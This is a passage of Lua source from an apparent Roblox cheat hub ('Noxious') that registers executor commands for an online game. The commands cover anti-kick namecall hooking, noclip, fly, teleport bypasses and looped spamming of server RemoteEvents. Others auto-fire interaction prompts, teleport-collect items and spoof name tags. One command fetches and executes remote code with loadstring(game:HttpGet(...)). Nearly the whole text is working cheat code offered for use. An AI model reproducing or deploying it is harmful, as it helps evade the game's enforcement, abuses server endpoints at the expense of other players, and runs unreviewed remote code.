		if self == noxious["local player"] and getnamecallmethod():lower() == "kick" then
			return
		end
		return oldhmmnc(self, ...)
	end)

	notify("This command does not work 100% at the time, and is only effective on LocalScripts.", 5, "warning")
end)

addcommand("disableantikick", "dak", function()

end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("fov", "fov", function(value)
	local playerCamera = game.Workspace.CurrentCamera
	if playerCamera then
		playerCamera.FieldOfView = value
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("maxzoom", "maxzoom", function(value)
	game.Players.LocalPlayer.CameraMaxZoomDistance = value
end)

addcommand("minzoom", "minzoom", function(value)
	game.Players.LocalPlayer.CameraMinZoomDistance = value
end)

-------------------------------------------------------------------------------------------------------------------------------

local tpwalking = false  -- Flag to control the teleport walking
local currentSpeed = 10  -- Default speed

addcommand("teleportwalk", "tpwalk", function(speaker, speed)
	tpwalking = true
	local chr = speaker.Character
	local hum = chr and chr:FindFirstChildWhichIsA"Humanoid"		
	local hb = noxious["run service"].Heartbeat

	-- Continuously teleport the character while tpwalking is true
	while tpwalking and chr and hum and hum.Parent do
		local delta = hb:Wait()
		if hum.MoveDirection.Magnitude > 0 then
			if speed and tonumber(speed) then
				currentSpeed = tonumber(speed) -- Update the speed if a valid number is provided
			end
			chr:TranslateBy(hum.MoveDirection * currentSpeed * delta * 10)
		end
	end
end)

addcommand("unteleportwalk", "untpwalk", function(speaker, speed)
	tpwalking = false
end)

-------------------------------------------------------------------------------------------------------------------------------

-- Variables for CF Fly
local CFloop

-- Function to enable Clip Frame Fly

addcommand("clipframefly", "cffly", function(speed)
	local character = noxious["local player"].Character
	if not character then return end

	local humanoid = character:FindFirstChildOfClass"Humanoid"		
	local head = character:WaitForChild"Head"

	if humanoid and head then
		humanoid.PlatformStand = true
		head.Anchored = true

		-- Disconnect existing loop if any
		if CFloop then CFloop:Disconnect() end

		-- Connect the Clip Frame Fly loop
		CFloop = noxious["run service"].Heartbeat:Connect(function(deltaTime)
			local moveDirection = humanoid.MoveDirection * (speed * deltaTime)
			local headCFrame = head.CFrame
			local cameraCFrame = workspace.CurrentCamera.CFrame
			local cameraOffset = headCFrame:ToObjectSpace(cameraCFrame).Position

			cameraCFrame = cameraCFrame * CFrame.new(-cameraOffset.X, -cameraOffset.Y, -cameraOffset.Z + 1)
			local cameraPosition = cameraCFrame.Position
			local headPosition = headCFrame.Position

			local objectSpaceVelocity = CFrame.new(cameraPosition, Vector3.new(headPosition.X, cameraPosition.Y, headPosition.Z)):VectorToObjectSpace(moveDirection)
			head.CFrame = CFrame.new(headPosition) * (cameraCFrame - cameraPosition) * CFrame.new(objectSpaceVelocity)
		end)
	end
end)

-- Function to disable Clip Frame Fly
addcommand("unclipframefly", "uncffly", function()
	local character = noxious["local player"].Character
	if not character then return end

	local humanoid = character:FindFirstChildOfClass"Humanoid"		
	local head = character:FindFirstChild"Head"

	if CFloop then CFloop:Disconnect() end -- Disconnect the loop
	if humanoid then humanoid.PlatformStand = false end
	if head then head.Anchored = false end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("floatgui", "fgui", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Team-Noxious/Noxious-Hub/refs/heads/main/Miscellaneous/Float%20GUI"))()
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("teleporttool", "tptool", function()
	local speaker = noxious["players"].LocalPlayer
	local IYMouse = noxious["players"].LocalPlayer:GetMouse()
	local TpTool = Instance.new"Tool"

	TpTool.Name = "teleport tool"
	TpTool.RequiresHandle = false
	TpTool.Parent = speaker.Backpack
	TpTool.Activated:Connect(function()
		local Char = speaker.Character or workspace:FindFirstChild(speaker.Name)
		local HRP = Char and Char:FindFirstChild"HumanoidRootPart"			
		HRP.CFrame = CFrame.new(IYMouse.Hit.X, IYMouse.Hit.Y + 3, IYMouse.Hit.Z, select(4, HRP.CFrame:components()))
	end)

	game:GetService"StarterGui":SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("reset", "re", function()
	local sp
	local so

	local function scs(character)
		local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
		if humanoidRootPart then
			sp = humanoidRootPart.Position
			so = humanoidRootPart.Orientation
		end
	end

	local function kc(character)
		local humanoid = character:FindFirstChildOfClass("Humanoid")
		if humanoid then
			humanoid.Health = 0
		end
	end

	local function oca(character)
		task.delay(0.2, function()
			if sp and so then
				character:WaitForChild("HumanoidRootPart")
				character:SetPrimaryPartCFrame(CFrame.new(sp) * CFrame.Angles(0, math.rad(so.Y), 0))
			end

			sp = nil
			so = nil
		end)
	end

	local function sktp(player)
		local character = player.Character or player.CharacterAdded:Wait()
		scs(character)
		kc(character)
		player.CharacterAdded:Connect(oca)
	end

	sktp(noxious["local player"])
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("die", "die", function()
	local player = game.Players.LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()
	local humanoid = character:FindFirstChild"Humanoid"

	if humanoid then
		humanoid.Health = 0
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

function createNoclip()
	local _=noxious["players"]        

	local connections = {} -- Store connections for toggling
	local touchedObjects = {} -- Store touched objects

	-- Function to check if a part should be ignored by noclip
	local function shouldIgnorePart(part)
		-- Ignore visualization spheres (ends with "Sphere")
		if string.match(part.Name, "Sphere$") then
			return true
		end

		-- Ignore MonsterBlockers
		if part.Name == "MonsterBlocker" then
			return true
		end

		-- Ignore parts that belong to the player
		if part:IsDescendantOf(noxious["local player"].Character) then
			return true
		end

		return false
	end

	-- Function to disable collision of the touched object
	local function disableCollision(part)
		if part and part:IsA("BasePart") and not shouldIgnorePart(part) then
			-- Only disable collision if it was originally collidable
			if part.CanCollide then
				part.CanCollide = false
				touchedObjects[part] = true
			end
		end
	end

	-- Function to enable collision of the object
	local function enableCollision(part)
		if part and part:IsA("BasePart") and touchedObjects[part] then
			part.CanCollide = true
			touchedObjects[part] = nil
		end
	end

	-- Function to handle the Touched event
	local function onTouched(otherPart)
		if not otherPart or not otherPart:IsA("BasePart") then return end

		-- Skip ignored parts
		if shouldIgnorePart(otherPart) then return end

		-- Handle Baseplate teleport logic
		if otherPart.Name == "Baseplate" then
			local elevatorsFolder = workspace:FindFirstChild("Elevators")                
			if elevatorsFolder then
				local elevatorModel = elevatorsFolder:FindFirstChildWhichIsA("Model")                    
				if elevatorModel then
					local monsterBlocker = elevatorModel:FindFirstChild("MonsterBlocker")                        
					if monsterBlocker and monsterBlocker:IsA("Part") then
						noxious["local player"].Character:SetPrimaryPartCFrame(monsterBlocker.CFrame)
					end
				end
			end
			return
		end

		-- Regular noclip handling
		if not touchedObjects[otherPart] then
			disableCollision(otherPart)
		end
	end

	-- Function to handle the TouchEnded event
	local function onTouchEnded(otherPart)
		if otherPart and otherPart:IsA("BasePart") then
			enableCollision(otherPart)
		end
	end

	-- Enable noclip for the character
	local function enableNoclip()
		local character = noxious["local player"].Character or noxious["local player"].CharacterAdded:Wait()
		local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

		if not connections.touched then
			connections.touched = humanoidRootPart.Touched:Connect(onTouched)
		end
		if not connections.touchEnded then
			connections.touchEnded = humanoidRootPart.TouchEnded:Connect(onTouchEnded)
		end
	end

	-- Disable noclip
	local function disableNoclip()
		for _, conn in pairs(connections) do
			conn:Disconnect()
		end
		connections = {}

		-- Re-enable collision for all parts that were touched
		for part in pairs(touchedObjects) do
			enableCollision(part)
		end
		touchedObjects = {}
	end

	return enableNoclip, disableNoclip
end

-- Create the noclip functions
local enableNoclip, disableNoclip = createNoclip()

addcommand("noclip", "noclip", function()
	enableNoclip()
end)

addcommand("unnoclip", "clip", function()
	disableNoclip()
end)

-------------------------------------------------------------------------------------------------------------------------------

local updateEnabled = true
local updateLoop 

function looprunspeed()
	local player = game.Players.LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()
	local statsFolder = character:WaitForChild"Stats"		
	local runSpeed = statsFolder:WaitForChild"RunSpeed"

	if not updateLoop then
		updateLoop = coroutine.create(function()
			while updateEnabled do
				character:WaitForChild"Humanoid".WalkSpeed = runSpeed.Value
				wait(0)
			end
		end)
		coroutine.resume(updateLoop)
	end
end

addcommand("enablelooprunspeed", "elrs", function()
	if not updateLoop then
		updateEnabled = true
		looprunspeed()
	end
end)

addcommand("disablelooprunspeed", "dlrs", function()
	local args = {
		[1] = false
	}

	game:GetService"ReplicatedStorage".Events.SprintEvent:FireServer(unpack(args))

	if updateLoop then
		updateEnabled = false
		updateLoop = nil
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("getresearch", "gr", function()
	local character = noxious["local player"].Character or noxious["local player"].CharacterAdded:Wait()
	local humanoidRootPart = character:WaitForChild"HumanoidRootPart"		
	local originalPosition = humanoidRootPart.CFrame

	tpBypass(originalPosition)
	wait(0)

	local currentRoom = game.Workspace:FindFirstChild"CurrentRoom"		
	if currentRoom then
		-- Set gravity to 0 for the duration of the loop
		workspace.Gravity = 0

		local visitedRazzleDazzle = false -- Flag to track RazzleDazzleMonster

		for _, model in ipairs(currentRoom:GetChildren()) do
			if model:IsA"Model"then
				local monstersFolder = model:FindFirstChild"Monsters"					
				if monstersFolder then
					for _, monster in ipairs(monstersFolder:GetChildren()) do
						if monster:IsA"Model"then
							-- Determine Y offset based on monster name
							local yOffset = 12 -- Default offset
							if monster.Name == "RodgerMonster" then
								yOffset = 5 -- Custom offset for RodgerMonster
							elseif monster.Name == "RazzleDazzleMonster" and not visitedRazzleDazzle then
								-- Handle RazzleDazzleMonster specifically
								visitedRazzleDazzle = true -- Mark as visited
								yOffset = 0
								humanoidRootPart.CFrame = monster:GetModelCFrame() + Vector3.new(0, yOffset, 0)
								workspace.Gravity = 196.2
								local VirtualInputManager = game:GetService"VirtualInputManager"									
								VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.W, false, game)
								wait(0.5) -- Wait for a brief moment
								VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.W, false, game)
								workspace.Gravity = 0
							end

							-- Teleport to each monster's position with the determined offset
							if monster.Name ~= "RazzleDazzleMonster" or not visitedRazzleDazzle then
								humanoidRootPart.CFrame = monster:GetModelCFrame() + Vector3.new(0, yOffset, 0)
								task.wait(0.5)
							end
						end
					end
				end
			end
		end

		-- Return to the original position
		humanoidRootPart.CFrame = originalPosition

		-- Wait briefly before restoring gravity
		task.wait(0.2)

		-- Restore original gravity
		workspace.Gravity = 196.2

		originalPosition = nil
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

local activeConnections = {}

-- Function to set collisions for a character
function setCollisions(character, canCollide)
	for _, descendant in ipairs(character:GetDescendants()) do
		if descendant:IsA("BasePart") then
			descendant.CanCollide = canCollide
		end
	end
end

-- Function to disable collisions for a character
function disableCollisions(character)
	setCollisions(character, false)
end

-- Function to enable collisions for a character
function enableCollisions(character)
	setCollisions(character, true)
end

-- Function to set up anti-fling for a player
function setupPlayerAntiFling(player)
	local Players = noxious["players"]
	local localPlayer = Players.LocalPlayer
	-- Skip the local player
	if player == localPlayer then
		return
	end

	-- Disconnect previous connection if it exists
	if activeConnections[player] then
		activeConnections[player]:Disconnect()
		activeConnections[player] = nil
	end

	-- Monitor the player's character
	local function monitorCharacter()
		if player.Character then
			disableCollisions(player.Character)

			-- Listen for new parts being added
			activeConnections[player] = player.Character.DescendantAdded:Connect(function(descendant)
				if descendant:IsA("BasePart") then
					descendant.CanCollide = false
				end
			end)
		end
	end

	-- Handle existing and future character changes
	player.CharacterAdded:Connect(monitorCharacter)
	monitorCharacter()
end

-- Function to clean up a player's anti-fling setup
function cleanupPlayerAntiFling(player)
	if activeConnections[player] then
		activeConnections[player]:Disconnect()
		activeConnections[player] = nil
	end
	if player.Character then
		enableCollisions(player.Character)
	end
end

addcommand("antifling", "af", function()
	local Players = noxious["players"]
	for _, player in ipairs(Players:GetPlayers()) do
		setupPlayerAntiFling(player)
	end

	Players.PlayerAdded:Connect(setupPlayerAntiFling)
	Players.PlayerRemoving:Connect(cleanupPlayerAntiFling)
end)

addcommand("unantifling", "uaf", function()
	local Players = noxious["players"]
	for _, player in ipairs(Players:GetPlayers()) do
		cleanupPlayerAntiFling(player)
	end

	activeConnections = {}
end)

-------------------------------------------------------------------------------------------------------------------------------

local running = true  -- Flag to control the loop
local loopConnection

-- Function to invoke the ability event
function invokeAbilityEvent()
	local args = {
		[1] = game:GetService"Players".LocalPlayer.Character,
		[2] = CFrame.new(-65.78115844726563, 145.7693634033203, 86.53424072265625) * CFrame.Angles(4.413669e-9, 2.9576959e-16, 5.3380848e-8),
		[3] = false
	}
	game:GetService"ReplicatedStorage".Events.AbilityEvent:InvokeServer(unpack(args))
end

-- Function to start the loop
addcommand("enableautouseability", "eaua", function()
	if running then
		loopConnection = noxious["run service"].Heartbeat:Connect(function()
			invokeAbilityEvent()  -- Call the ability event
			wait(0)  -- Wait 0.3 seconds before invoking again
		end)
	end
end)

-- Function to stop the loop
addcommand("disableautouseability", "daua", function()
	if loopConnection then
		loopConnection:Disconnect()  -- Disconnect the loop
		loopConnection = nil
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

local iatogglestate = false
local pprange = 30

function interactWithPrompt(prompt)
	if prompt.HoldDuration == 0 then
		prompt:InputHoldBegin()
		prompt:InputHoldEnd()
	else
		prompt:InputHoldBegin()
		wait(prompt.HoldDuration)
		prompt:InputHoldEnd()
	end
end

function checkForProximityPrompts()
	if iatogglestate then
		local player = game.Players.LocalPlayer
		local character = player.Character
		if character then
			local humanoidRootPart = character:FindFirstChild"HumanoidRootPart"				
			if humanoidRootPart then
				local currentRoomFolder = workspace:FindFirstChild"CurrentRoom"					
				if currentRoomFolder then
					for _, model in pairs(currentRoomFolder:GetChildren()) do
						local itemsFolder = model:FindFirstChild"Items"							
						if itemsFolder then
							for _, item in pairs(itemsFolder:GetChildren()) do
								local promptPart = item:FindFirstChild"Prompt"									
								if promptPart then
									local proximityPrompt = promptPart:FindFirstChild"ProximityPrompt"										
									if proximityPrompt and proximityPrompt.Enabled then
										local distance = (promptPart.Position - humanoidRootPart.Position).Magnitude
										if distance <= pprange then
											interactWithPrompt(proximityPrompt)
										end
									end
								end
							end
						end
					end
				end
			end
		end
	end
end

addcommand("enableitemaura", "eia", function()
	if not iatogglestate then
		iatogglestate = true
		while iatogglestate do
			checkForProximityPrompts()
			wait(0)
		end
	end
end)

addcommand("disableitemaura", "dia", function()
	if iatogglestate then
		iatogglestate = false
	end
end)

local itemaura2enabled = false
local itemaura2connection = nil

addcommand("enableitemaura2", "eia2", function()
	if itemaura2enabled then return end
	itemaura2enabled = true

	itemaura2connection = noxious["run service"].Heartbeat:Connect(function()
		fireItemProximityPrompts()
	end)
end)

addcommand("disableitemaura2", "dia2", function()
	if not itemaura2enabled then return end
	itemaura2enabled = false

	if itemaura2connection then
		itemaura2connection:Disconnect()
		itemaura2connection = nil
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

local gatogglestate = false

local function waitForModelInRoom()
	local currentRoom = workspace:WaitForChild("CurrentRoom")
	local modelInRoom
	repeat
		modelInRoom = currentRoom:FindFirstChildWhichIsA("Model")
		task.wait(0.1) -- Small delay between checks to prevent spamming
	until modelInRoom
	return modelInRoom
end

function isingeneratorsfolder(prompt)
	local Workspace = game:GetService("Workspace")
	Workspace:WaitForChild("CurrentRoom")
	local modelInRoom = waitForModelInRoom()
	local itemsFolder = modelInRoom:WaitForChild("Items")
	local parent = prompt.Parent
	while parent do
		if parent.Parent == itemsFolder then
			return true
		end
		parent = parent.Parent
	end
	return false
end

function checkForgeneratorProximityPrompts()
	local Workspace = game:GetService("Workspace")
	Workspace:WaitForChild("CurrentRoom")
	local modelInRoom = waitForModelInRoom()
	local itemsFolder = modelInRoom:WaitForChild("Generators")
	for _, v in ipairs(itemsFolder:GetDescendants()) do
		if v:IsA("ProximityPrompt") and isingeneratorsfolder(v) then
			fireproximityprompt(v)
		end
	end
end

addcommand("enablegeneratoraura", "ega", function()
	if not gatogglestate then
		gatogglestate = true
		while gatogglestate do
			checkForgeneratorProximityPrompts()
			wait(0.05)
		end
	end
end)

addcommand("disablegeneratoraura", "dga", function()
	if gatogglestate then
		gatogglestate = false
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

local isautouseitemslooprunning = true 

function invokeItemEvent(slot)
	local ReplicatedStorage = game:GetService"ReplicatedStorage"		
	local Character = noxious["local player"].Character
	local Inventory = Character.Inventory
	local args = {
		[1] = Character,
		[2] = Inventory:FindFirstChild(slot)
	}

	if args[2] then
		ReplicatedStorage.Events.ItemEvent:InvokeServer(unpack(args))
	end
end

-- Function to start the loop
function startautouseitemsloop()
	while isautouseitemslooprunning do
		spawn(function()
			invokeItemEvent"Slot1"			
		end)

		spawn(function()
			invokeItemEvent"Slot2"			
		end)

		spawn(function()
			invokeItemEvent"Slot3"			
		end)

		wait(0)
	end
end

addcommand("enableautouseitems", "eaui", function()
	isautouseitemslooprunning = true
	startautouseitemsloop()
end)

addcommand("disableautouseitems", "daui", function()
	isautouseitemslooprunning = false
end)

-------------------------------------------------------------------------------------------------------------------------------

function tpBypass(cf)
	noxious["local player"].Character.HumanoidRootPart.CFrame = cf * CFrame.new(0, 2000, 0)
	task.wait(0.1)

	for i = 1, 3 do
		noxious["local player"].Character.HumanoidRootPart.CFrame = cf
		task.wait(0.05)
	end
end

addcommand("pickupallitems", "puai", function()
	spawn(function() game.Workspace.Gravity = 0 end)
	spawn(function() execcmd("noclip") end)
	local player = game.Players.LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()
	local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
	local originalPosition = humanoidRootPart.CFrame

	tpBypass(originalPosition)
	wait(0)

	local currentRoom = game.Workspace:FindFirstChild("CurrentRoom")
	if currentRoom then
		local itemPositions = {}
		for _, model in ipairs(currentRoom:GetChildren()) do
			if model:IsA("Model") then
				local itemsFolder = model:FindFirstChild("Items")
				if itemsFolder then
					for _, item in ipairs(itemsFolder:GetChildren()) do
						if item:IsA("Model") then
							table.insert(itemPositions, item:GetModelCFrame() * CFrame.new(0, -3.3, 0))
						end
					end
				end
			end
		end

		for _, itemCFrame in ipairs(itemPositions) do
			humanoidRootPart.CFrame = itemCFrame
			wait(0.3)
		end
	end

	wait(0)

	humanoidRootPart.CFrame = originalPosition
	spawn(function() execcmd("clip") end)
	spawn(function() game.Workspace.Gravity = 196.2 end)
end)

addcommand("pickupallresearchcapsules", "purc", function()
	spawn(function() game.Workspace.Gravity = 0 end)
	spawn(function() execcmd("noclip") end)
	local player = game.Players.LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()
	local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
	local originalPosition = humanoidRootPart.CFrame

	tpBypass(originalPosition)
	wait(0)

	local currentRoom = game.Workspace:FindFirstChild("CurrentRoom")
	if currentRoom then
		local itemPositions = {}
		for _, model in ipairs(currentRoom:GetChildren()) do
			if model:IsA("Model") then
				local itemsFolder = model:FindFirstChild("Items")
				if itemsFolder then
					for _, item in ipairs(itemsFolder:GetChildren()) do
						if item:IsA("Model") and item.Name == "ResearchCapsule" then
							table.insert(itemPositions, item:GetModelCFrame() * CFrame.new(0, -3.3, 0))
						end
					end
				end
			end
		end

		for _, itemCFrame in ipairs(itemPositions) do
			humanoidRootPart.CFrame = itemCFrame
			wait(0.3)
		end
	end

	wait(0)

	humanoidRootPart.CFrame = originalPosition
	spawn(function() execcmd("clip") end)
	spawn(function() game.Workspace.Gravity = 196.2 end)
end)

addcommand("pickupalltapes", "puat", function()
	spawn(function() game.Workspace.Gravity = 0 end)
	spawn(function() execcmd("noclip") end)
	local player = game.Players.LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()
	local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
	local originalPosition = humanoidRootPart.CFrame

	tpBypass(originalPosition)
	wait(0)

	local currentRoom = game.Workspace:FindFirstChild("CurrentRoom")
	if currentRoom then
		local itemPositions = {}
		for _, model in ipairs(currentRoom:GetChildren()) do
			if model:IsA("Model") then
				local itemsFolder = model:FindFirstChild("Items")
				if itemsFolder then
					for _, item in ipairs(itemsFolder:GetChildren()) do
						if item:IsA("Model") and item.Name == "Tape" then
							table.insert(itemPositions, item:GetModelCFrame() * CFrame.new(0, -3.3, 0))
						end
					end
				end
			end
		end

		for _, itemCFrame in ipairs(itemPositions) do
			humanoidRootPart.CFrame = itemCFrame
			wait(0.3)
		end
	end

	wait(0)

	humanoidRootPart.CFrame = originalPosition
	spawn(function() execcmd("clip") end)
	spawn(function() game.Workspace.Gravity = 196.2 end)
end)

addcommand("pickupallheals", "puah", function()
	spawn(function() game.Workspace.Gravity = 0 end)
	spawn(function() execcmd("noclip") end)
	local player = game.Players.LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()
	local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
	local originalPosition = humanoidRootPart.CFrame

	tpBypass(originalPosition)
	wait(0)

	local currentRoom = game.Workspace:FindFirstChild("CurrentRoom")
	if currentRoom then
		local itemPositions = {}
		for _, model in ipairs(currentRoom:GetChildren()) do
			if model:IsA("Model") then
				local itemsFolder = model:FindFirstChild("Items")
				if itemsFolder then
					for _, item in ipairs(itemsFolder:GetChildren()) do
						if item:IsA("Model") and item.Name == "HealthKit" or item.Name == "Bandage" then
							table.insert(itemPositions, item:GetModelCFrame() * CFrame.new(0, -3.3, 0))
						end
					end
				end
			end
		end

		for _, itemCFrame in ipairs(itemPositions) do
			humanoidRootPart.CFrame = itemCFrame
			wait(0.3)
		end
	end

	wait(0)

	humanoidRootPart.CFrame = originalPosition
	spawn(function() execcmd("clip") end)
	spawn(function() game.Workspace.Gravity = 196.2 end)
end)

addcommand("pickupallbaskets", "puab", function()
	spawn(function() game.Workspace.Gravity = 0 end)
	spawn(function() execcmd("noclip") end)
	local player = game.Players.LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()
	local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
	local originalPosition = humanoidRootPart.CFrame

	tpBypass(originalPosition)
	wait(0)

	local currentRoom = game.Workspace:FindFirstChild("CurrentRoom")
	if currentRoom then
		local itemPositions = {}
		for _, model in ipairs(currentRoom:GetChildren()) do
			if model:IsA("Model") then
				local itemsFolder = model:FindFirstChild("Items")
				if itemsFolder then
					for _, item in ipairs(itemsFolder:GetChildren()) do
						if item:IsA("Model") and item.Name == "HolidayCollectibleItem" then
							table.insert(itemPositions, item:GetModelCFrame() * CFrame.new(0, -3.3, 0))
						end
					end
				end
			end
		end

		for _, itemCFrame in ipairs(itemPositions) do
			humanoidRootPart.CFrame = itemCFrame
			wait(0.3)
		end
	end

	wait(0)

	humanoidRootPart.CFrame = originalPosition
	spawn(function() execcmd("clip") end)
	spawn(function() game.Workspace.Gravity = 196.2 end)
end)

addcommand("pickupallextractionitems", "puaei", function()
	spawn(function() game.Workspace.Gravity = 0 end)
	spawn(function() execcmd("noclip") end)
	local player = game.Players.LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()
	local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
	local originalPosition = humanoidRootPart.CFrame

	tpBypass(originalPosition)
	wait(0)

	local currentRoom = game.Workspace:FindFirstChild("CurrentRoom")
	if currentRoom then
		local itemPositions = {}
		for _, model in ipairs(currentRoom:GetChildren()) do
			if model:IsA("Model") then
				local itemsFolder = model:FindFirstChild("Items")
				if itemsFolder then
					for _, item in ipairs(itemsFolder:GetChildren()) do
						if item:IsA("Model") and item.Name == "JumperCable" then
							table.insert(itemPositions, item:GetModelCFrame() * CFrame.new(0, -3.3, 0))
						end
					end
				end
			end
		end

		for _, itemCFrame in ipairs(itemPositions) do
			humanoidRootPart.CFrame = itemCFrame
			wait(0.3)
		end
	end

	wait(0)

	humanoidRootPart.CFrame = originalPosition
	spawn(function() execcmd("clip") end)
	spawn(function() game.Workspace.Gravity = 196.2 end)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("changeusername", "cuser", function(newName)
	local _=noxious["players"]

	spawn(function()
		local playerName = noxious["local player"].Name

		-- Check for "Players" folder; if not found, look for "InGamePlayers"
		local playersFolder = workspace:FindFirstChild("Players") or workspace:WaitForChild("InGamePlayers")
		local playerModel = playersFolder:WaitForChild(playerName)

		local humanoidRootPart = playerModel:WaitForChild("HumanoidRootPart")
		local nameTag = humanoidRootPart:WaitForChild("NameTag")
		local frame = nameTag:WaitForChild("Frame")

		local usernamelabel = frame:WaitForChild("UserName")
		usernamelabel.Text = "(@" .. newName .. ")"  -- Update the username label
	end)

	-- Access the 'welcome2' label (for username)
	local topFrame
	if game.PlaceId == noxious["test game"] then
		topFrame = noxious["players"].LocalPlayer.PlayerGui:FindFirstChild(noxious["noxious screen gui"].Name).mainframe:WaitForChild("TopFrame")
	else
		topFrame = game:GetService("CoreGui").Noxious.mainframe:WaitForChild("TopFrame")
	end

	local welcome2 = topFrame:WaitForChild("welcome2")  -- Username
	local welcome3 = topFrame:WaitForChild("welcome3")  -- Username
	welcome2.Text = "(@" .. newName .. ")"  -- Update the 'welcome2' label with the new username
	welcome3.Text = "(@" .. newName .. ")"  -- Update the 'welcome2' label with the new username
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("changedisplayname", "cdisplay", function(newName)
	local _=noxious["players"]

	spawn(function()
		local playerName = noxious["local player"].Name

		-- Check for "Players" folder; if not found, look for "InGamePlayers"
		local playersFolder = workspace:FindFirstChild("Players") or workspace:WaitForChild("InGamePlayers")
		local playerModel = playersFolder:WaitForChild(playerName)

		local humanoidRootPart = playerModel:WaitForChild("HumanoidRootPart")
		local nameTag = humanoidRootPart:WaitForChild("NameTag")
		local frame = nameTag:WaitForChild("Frame")

		local displaynamelabel = frame:WaitForChild("DisplayName")
		displaynamelabel.Text = newName
	end)

	-- Access the 'welcome' labels
	local topFrame
	if game.PlaceId == noxious["test game"] then
		topFrame = noxious["players"].LocalPlayer.PlayerGui:FindFirstChild(noxious["noxious screen gui"].Name).mainframe:WaitForChild("TopFrame")
	else
		topFrame = game:GetService("CoreGui").Noxious.mainframe:WaitForChild("TopFrame")
	end

	local welcome = topFrame:WaitForChild("welcome")  -- Displayname
	local welcome4 = topFrame:WaitForChild("welcome4")  -- Displayname
	welcome.Text = newName  -- Update the 'welcome' label with the new display name
	welcome4.Text = newName  -- Update the 'welcome' label with the new display name
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("changeownertagtext", "cotagt", function(newName)
	game:GetService"Players"		

	local playerName = noxious["local player"].Name

	local playersFolder = workspace:FindFirstChild"Players"or workspace:WaitForChild"InGamePlayers"		
	local playerModel = playersFolder:WaitForChild(playerName)

	local humanoidRootPart = playerModel:WaitForChild"HumanoidRootPart"		
	local nameTag = humanoidRootPart:WaitForChild"NameTag"		
	local frame = nameTag:WaitForChild"Frame"

	local ownerlabel = frame:WaitForChild"GroupRank"		
	ownerlabel.Text = "[" .. newName .. "]"
end)

-------------------------------------------------------------------------------------------------------------------------------

local scriptEnabled = false

addcommand("enableglitchednametag", "egnt", function()
	game:GetService"Players"		

	local playerName = noxious["local player"].Name

	local playersFolder = workspace:FindFirstChild"Players"or workspace:FindFirstChild"InGamePlayers"		
	local playerModel = playersFolder and playersFolder:FindFirstChild(playerName)

	-- Access the welcome labels
	if game.PlaceId == noxious["test game"] then
		game:GetService"Players".LocalPlayer.PlayerGui:FindFirstChild(noxious["noxious screen gui"].Name).mainframe:WaitForChild"TopFrame"		
	end

	if game.PlaceId == not noxious["test game"] then
		game:GetService"CoreGui".Noxious.mainframe:WaitForChild"TopFrame"		
	end

	local welcome = noxious["top frame"]:WaitForChild("welcome")		
	local welcome2 = noxious["top frame"]:WaitForChild("welcome2")

	-- If playersFolder and playerModel exist, proceed to replace NameTag text
	if playersFolder and playerModel then
		local humanoidRootPart = playerModel:WaitForChild"HumanoidRootPart"			
		local nameTag = humanoidRootPart:WaitForChild"NameTag"			
		local frame = nameTag:WaitForChild"Frame"

		local displayNameLabel = frame:WaitForChild"DisplayName"			
		local userNameLabel = frame:WaitForChild"UserName"
		-- Save original NameTag text

		savedDisplayName = displayNameLabel.Text
		savedUserName = userNameLabel.Text
	end

	scriptEnabled = true
	while scriptEnabled do
		local randomText = randomstring(16)

		-- Update welcome labels
		welcome.Text = "Welcome, " .. randomText .. "!"
		welcome2.Text = "(@" .. randomText .. ")"

		-- Update NameTag labels if applicable
		if playersFolder and playerModel then
			local humanoidRootPart = playerModel:WaitForChild"HumanoidRootPart"				
			local nameTag = humanoidRootPart:WaitForChild"NameTag"				
			local frame = nameTag:WaitForChild"Frame"

			local displayNameLabel = frame:WaitForChild"DisplayName"				
			local userNameLabel = frame:WaitForChild"UserName"

			displayNameLabel.Text = randomText
			userNameLabel.Text = "(@" .. randomText .. ")"
		end

		wait(0)
	end
end)

addcommand("disableglitchednametag", "dgnt", function()
	scriptEnabled = false

	game:GetService"Players"		

	local playerName = noxious["local player"].Name

	local playersFolder = workspace:FindFirstChild"Players"or workspace:FindFirstChild"InGamePlayers"		
	local playerModel = playersFolder and playersFolder:FindFirstChild(playerName)

	-- Access the welcome labels
	if game.PlaceId == noxious["test game"] then
		game:GetService"Players".LocalPlayer.PlayerGui:FindFirstChild(noxious["noxious screen gui"].Name).mainframe:WaitForChild"TopFrame"		
	end

	if game.PlaceId == not noxious["test game"] then
		game:GetService"CoreGui".Noxious.mainframe:WaitForChild"TopFrame"		
	end

	local welcome = noxious["top frame"]:WaitForChild"welcome"		
	local welcome2 = noxious["top frame"]:WaitForChild"welcome2"

	welcome.Text = welcometxt
	welcome2.Text = welcome2txt

	-- Restore NameTag labels if applicable
	if playersFolder and playerModel then
